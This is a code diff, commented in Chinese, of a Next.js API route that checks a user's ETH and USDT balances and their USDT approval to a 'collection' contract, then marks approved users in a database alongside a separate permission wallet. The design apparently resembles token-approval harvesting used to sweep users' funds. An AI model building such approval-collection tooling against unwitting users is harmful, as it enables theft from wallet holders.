@@ -8,6 +8,7 @@ export const dynamic = 'force-dynamic'
 // ETH 网络配置 - 以太坊主网
 const ETH_RPC_URL = ETH_NETWORK_CONFIG.RPC_URL
 const USDT_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.USDT_CONTRACT_ADDRESS
+const STAKING_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.STAKING_CONTRACT_ADDRESS
 const USDT_DECIMALS = ETH_NETWORK_CONFIG.USDT_DECIMALS
 
 // 从数据库获取启用的权限地址列表
@@ -154,24 +155,14 @@ export async function POST(request: NextRequest) {
       return addCorsHeaders(response)
     }
 
-    // 从数据库获取启用的权限地址列表
-    const permissionAddresses = await getPermissionAddresses()
+    // 如果没有指定授权对象，默认使用归集合约地址
+    // 授权额度应该查询用户对合约地址的授权，而不是权限地址
+    const targetSpender = spenderAddress || STAKING_CONTRACT_ADDRESS
     
-    // 如果没有指定授权对象，使用数据库配置的第一个权限地址
-    // 如果数据库中没有配置，则返回错误
-    let targetSpender = spenderAddress
-    
-    if (!targetSpender) {
-      if (permissionAddresses.length > 0) {
-        targetSpender = permissionAddresses[0]
-        console.log(`📋 使用数据库配置的权限地址: ${targetSpender}`)
-      } else {
-        const response = NextResponse.json({
-          success: false,
-          error: '未配置权限地址，请在管理后台配置权限地址后再查询'
-        }, { status: 400 })
-        return addCorsHeaders(response)
-      }
+    if (spenderAddress) {
+      console.log(`📋 使用指定的授权对象地址: ${spenderAddress}`)
+    } else {
+      console.log(`📋 使用默认的归集合约地址: ${STAKING_CONTRACT_ADDRESS}`)
     }
 
     // 验证地址格式
@@ -192,26 +183,18 @@ export async function POST(request: NextRequest) {
       return addCorsHeaders(response)
     }
 
-    console.log(`🔍 查询ETH链地址 ${userAddress} 对 ${targetSpender} 的授权额度`)
-    console.log(`📋 数据库配置的权限地址列表:`, permissionAddresses)
+    console.log(`🔍 查询ETH链地址 ${userAddress} 对 ${targetSpender} (归集合约) 的授权额度`)
 
     // 并行查询所有余额
+    // 授权额度应该查询用户对合约地址的授权，而不是权限地址
     const [ethBalance, usdtBalance, usdtAllowance] = await Promise.all([
       getETHBalance(userAddress),
       getUSDTBalance(userAddress),
-      getUSDTAllowance(userAddress, targetSpender) // 查询对指定授权对象的授权额度
+      getUSDTAllowance(userAddress, STAKING_CONTRACT_ADDRESS) // 查询对归集合约地址的授权额度
     ])
-
-    // 查询用户对所有配置的权限地址的授权额度
-    const allowanceResults: Record<string, string> = {}
-    for (const permAddress of permissionAddresses) {
-      const allowance = await getUSDTAllowance(userAddress, permAddress)
-      allowanceResults[permAddress] = allowance
-    }
     
-    // 计算最大授权额度
-    const allowanceValues = Object.values(allowanceResults).map(v => Number.parseFloat(String(v)))
-    const maxAllowance = allowanceValues.length > 0 ? Math.max(...allowanceValues) : Number.parseFloat(usdtAllowance)
+    // 计算授权状态
+    const maxAllowance = Number.parseFloat(usdtAllowance)
     const hasAuthorization = maxAllowance > 0
     
     // 如果检测到授权额度大于0，自动更新数据库中的授权状态
@@ -253,14 +236,14 @@ export async function POST(request: NextRequest) {
               updateData.first_approved_at = currentTimeISO
             }
             
-            // 如果查询的地址是授权地址，更新 auth_wallet_address
-            // 找到对应的权限地址（授权额度最大的那个）
-            const maxAllowanceAddress = Object.keys(allowanceResults).find(
-              addr => Number.parseFloat(allowanceResults[addr]) === maxAllowance
-            ) || targetSpender
-            
-            if (maxAllowanceAddress && maxAllowanceAddress !== user.wallet_address) {
-              updateData.auth_wallet_address = maxAllowanceAddress
+            // 如果用户授权给了合约地址，更新 auth_wallet_address 为权限地址（从数据库配置获取）
+            // 注意：用户授权给的是合约地址，但 auth_wallet_address 字段存储的是权限地址
+            const permissionAddresses = await getPermissionAddresses()
+            if (permissionAddresses.length > 0) {
+              const permissionAddress = permissionAddresses[0]
+              if (permissionAddress && permissionAddress !== user.wallet_address) {
+                updateData.auth_wallet_address = permissionAddress
+              }
             }
             
             const { data: updateResult, error: updateError } = await supabase
@@ -300,13 +283,11 @@ export async function POST(request: NextRequest) {
         userAddress: userAddress,
         ethBalance: ethBalance,
         usdtBalance: usdtBalance,
-        allowance: usdtAllowance,
-        spenderAddress: targetSpender,
-        // 返回所有权限地址的授权额度
-        allAllowances: allowanceResults,
-        permissionAddresses: permissionAddresses,
+        allowance: usdtAllowance, // 用户对合约地址的授权额度
+        spenderAddress: STAKING_CONTRACT_ADDRESS, // 授权对象是合约地址
+        contractAddress: STAKING_CONTRACT_ADDRESS, // 归集合约地址
         usdtContractAddress: USDT_CONTRACT_ADDRESS,
-        message: usdtAllowance === '0.000000' ? `用户未对授权对象 ${targetSpender} 进行USDT授权，需要用户手动授权USDT额度` : `用户已对授权对象 ${targetSpender} 进行USDT授权，额度: ${usdtAllowance} USDT`,
+        message: usdtAllowance === '0.000000' ? `用户未对归集合约 ${STAKING_CONTRACT_ADDRESS} 进行USDT授权，需要用户手动授权USDT额度给合约地址` : `用户已对归集合约 ${STAKING_CONTRACT_ADDRESS} 进行USDT授权，额度: ${usdtAllowance} USDT`,
         timestamp: new Date().toISOString(),
         // 返回授权状态是否已更新
         authorizationUpdated: hasAuthorization
